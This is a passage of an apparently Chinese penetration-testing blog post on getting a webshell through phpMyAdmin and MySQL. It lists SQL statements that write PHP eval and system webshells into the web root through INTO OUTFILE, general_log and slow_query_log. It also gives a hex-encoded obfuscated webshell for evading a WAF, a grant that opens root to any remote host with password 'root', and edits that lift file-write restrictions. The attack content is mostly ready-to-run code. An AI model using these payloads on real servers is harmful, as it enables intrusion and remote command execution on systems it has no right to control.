+<h3 id="常规语句导出webshell"><a href="#常规语句导出webshell" class="headerlink" title="常规语句导出webshell"></a>常规语句导出webshell</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select <span class="string">&#x27;&lt;?php @eval($_POST[pass]);?&gt;&#x27;</span> into outfile <span class="string">&#x27;c:/phpstudy/www/webshell.php&#x27;</span>;  </span><br><span class="line">select <span class="string">&#x27;&lt;?php @eval($_POST[pass]);?&gt;&#x27;</span> into outfile <span class="string">&#x27;c:\\phpstudy\\www\\web.php&#x27;</span>;</span><br><span class="line">select <span class="string">&#x27;&lt;?php @eval($_POST[pass]);?&gt;&#x27;</span> into dumpfile <span class="string">&#x27;c:\\phpstudy\\www\\web.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">select <span class="string">&#x27;&lt;?php echo \&#x27;&lt;pre&gt;\&#x27;;system($_GET[\&#x27;cmd\&#x27;]); echo \&#x27;&lt;/pre&gt;\&#x27;; ?&gt;&#x27;</span> into outfile <span class="string">&#x27;C:\\phpStudy\\WWW\\webshell.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="日志文件爆出shell"><a href="#日志文件爆出shell" class="headerlink" title="日志文件爆出shell"></a>日志文件爆出shell</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">show <span class="keyword">global</span> variables like <span class="string">&quot;%genera%&quot;</span>;                      <span class="comment">//查询general_log配置</span></span><br><span class="line">set <span class="keyword">global</span> general_log=<span class="string">&#x27;on&#x27;</span>;                                <span class="comment">//开启general log模式</span></span><br><span class="line">SET <span class="keyword">global</span> general_log_file=<span class="string">&#x27;C:/phpStudy/WWW/web.php&#x27;</span>;      <span class="comment">//设置日志文件保存路径</span></span><br><span class="line">SELECT <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>;                                <span class="comment">//phpinfo()写入日志文件</span></span><br><span class="line">set <span class="keyword">global</span> general_log=<span class="string">&#x27;off&#x27;</span>;                               <span class="comment">//关闭general_log模式</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="slow-query-log-file获取shell"><a href="#slow-query-log-file获取shell" class="headerlink" title="slow_query_log_file获取shell"></a>slow_query_log_file获取shell</h3><p>慢查询日志文件路径 </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">show variables like <span class="string">&#x27;slow_query_log_file&#x27;</span>;</span><br><span class="line">set <span class="keyword">global</span> slow_query_log=on;</span><br><span class="line">set <span class="keyword">global</span> slow_query_log_file=<span class="string">&quot;C:\\phpStudy\\WWW\\shell.php&quot;</span>;</span><br><span class="line">select sleep(<span class="number">15</span>),<span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>;</span><br><span class="line">set <span class="keyword">global</span> slow_query_log=off;</span><br></pre></td></tr></table></figure>
+
+<p>利用general_log或slow_query_log在成功写入Webshel后建议立即OFF关闭，否则可能会因为php.ini配置文件中的memory_limit参数设定的内存值太小而出现“内存不足”的报错。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fatal error: Allowed memory size of 16777216 bytes exhausted (tried to allocate 16777216 bytes) in &#x2F;data&#x2F;home&#x2F;arco&#x2F;www&#x2F;funn&#x2F;index.php on line 234</span><br></pre></td></tr></table></figure>
+
+<h3 id="绕过WAF"><a href="#绕过WAF" class="headerlink" title="绕过WAF"></a>绕过WAF</h3><h4 id="开启外链"><a href="#开启外链" class="headerlink" title="开启外链"></a>开启外链</h4><p>开启外链来执行导出Webshell的SQL语句，因为这样走的不是POST、GET方式，所以这样执行SQL语句是不会被WAF拦截的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grant all privileges on *.* to &#39;root&#39;@&#39;%&#39; identified by &#39;root&#39; with grant option;    &#x2F;&#x2F;开启MySQL外链flush privileges;                          &#x2F;&#x2F;刷新MySQL系统权限相关表</span><br></pre></td></tr></table></figure>
+
+<h4 id="十六进制"><a href="#十六进制" class="headerlink" title="十六进制"></a>十六进制</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="number">0x3c3f7068702024613d636f6e766572745f75756465636f646528222638372d5339372954206022293b40246128245f504f53545b27212a21275d293b3f3e</span> into outfile <span class="string">&#x27;C:\\phpStudy\\WWW\\webshell.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="常见报错"><a href="#常见报错" class="headerlink" title="常见报错"></a>常见报错</h3><ul>
+<li><p><code>secure_file_priv</code>限制</p>
+<p>在my.ini、my.cnf、mysqld.cnf文件中找到secure_file_prive并将其值设置为空””或斜杠”/“，然后重启MySQL服务即可。</p>
+</li>
+<li><p>权限不足</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access denied <span class="keyword">for</span> user <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> (using password: YES) </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span> mysql.user;                                <span class="comment">//查询所有用户权限</span></span><br><span class="line">select * <span class="keyword">from</span> mysql.user where user=<span class="string">&quot;root&quot;</span>;              <span class="comment">//查询root用户权限</span></span><br><span class="line">update user set File_priv =<span class="string">&#x27;Y&#x27;</span> where user = <span class="string">&#x27;root&#x27;</span>;      <span class="comment">//允许root用户读写文件</span></span><br><span class="line">update user set File_priv =<span class="string">&#x27;N&#x27;</span> where user = <span class="string">&#x27;root&#x27;</span>;      <span class="comment">//禁止root用户读写文件</span></span><br><span class="line">flush privileges</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%93shell%E8%8E%B7%E5%8F%96"><span class="toc-number">1.</span> <span class="toc-text">渗透测试–shell获取</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E8%8E%B7%E5%8F%96shell"><span class="toc-number">1.1.</span> <span class="toc-text">sql注入获取shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E8%AF%BB%E5%86%99shell"><span class="toc-number">1.1.1.</span> <span class="toc-text">联合注入读写shell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">读文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">写文件</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E8%AF%BB%E5%86%99shell"><span class="toc-number">1.1.1.2.1.</span> <span class="toc-text">报错注入读写shell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%96%87%E4%BB%B6%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8"><span class="toc-number">1.1.1.2.2.</span> <span class="toc-text">判断文件是否存在</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%8B%BFshell"><span class="toc-number">1.1.2.</span> <span class="toc-text">日志拿shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E9%85%8D%E5%90%88%E6%97%A5%E5%BF%97%E4%B8%8A%E4%BC%A0shell"><span class="toc-number">1.1.3.</span> <span class="toc-text">堆叠注入配合日志上传shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap%E5%B8%B8%E8%A7%81%E4%BD%BF%E7%94%A8%E5%8F%82%E6%95%B0"><span class="toc-number">1.1.4.</span> <span class="toc-text">sqlmap常见使用参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql%E5%AF%86%E7%A0%81%E7%9A%84%E8%8E%B7%E5%8F%96"><span class="toc-number">1.1.5.</span> <span class="toc-text">mysql密码的获取</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phpadmin%E5%90%8E%E5%8F%B0%E8%8E%B7%E5%8F%96shell"><span class="toc-number">1.2.</span> <span class="toc-text">phpadmin后台获取shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E5%AF%BC%E5%87%BAwebshell"><span class="toc-number">1.2.1.</span> <span class="toc-text">利用数据库表导出webshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E8%AF%AD%E5%8F%A5%E5%AF%BC%E5%87%BAwebshell"><span class="toc-number">1.2.2.</span> <span class="toc-text">常规语句导出webshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E7%88%86%E5%87%BAshell"><span class="toc-number">1.2.3.</span> <span class="toc-text">日志文件爆出shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#slow-query-log-file%E8%8E%B7%E5%8F%96shell"><span class="toc-number">1.2.4.</span> <span class="toc-text">slow_query_log_file获取shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87WAF"><span class="toc-number">1.2.5.</span> <span class="toc-text">绕过WAF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%80%E5%90%AF%E5%A4%96%E9%93%BE"><span class="toc-number">1.2.5.1.</span> <span class="toc-text">开启外链</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6"><span class="toc-number">1.2.5.2.</span> <span class="toc-text">十六进制</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%8A%A5%E9%94%99"><span class="toc-number">1.2.6.</span> <span class="toc-text">常见报错</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://s1eady.top/2020/11/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--shell%E8%8E%B7%E5%8F%96/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://s1eady.top/2020/11/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--shell%E8%8E%B7%E5%8F%96/&text=渗透测试--shell获取"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://s1eady.top/2020/11/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--shell%E8%8E%B7%E5%8F%96/&title=渗透测试--shell获取"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://s1eady.top/2020/11/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--shell%E8%8E%B7%E5%8F%96/&is_video=false&description=渗透测试--shell获取"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=渗透测试--shell获取&body=Check out this article: http://s1eady.top/2020/11/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--shell%E8%8E%B7%E5%8F%96/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://s1eady.top/2020/11/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--shell%E8%8E%B7%E5%8F%96/&title=渗透测试--shell获取"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://s1eady.top/2020/11/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--shell%E8%8E%B7%E5%8F%96/&title=渗透测试--shell获取"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://s1eady.top/2020/11/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--shell%E8%8E%B7%E5%8F%96/&title=渗透测试--shell获取"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://s1eady.top/2020/11/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--shell%E8%8E%B7%E5%8F%96/&title=渗透测试--shell获取"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://s1eady.top/2020/11/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--shell%E8%8E%B7%E5%8F%96/&name=渗透测试--shell获取&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://s1eady.top/2020/11/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--shell%E8%8E%B7%E5%8F%96/&t=渗透测试--shell获取"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2018.12.8-2020
+    steady
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'cactus-1';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
+</body>
+</html>
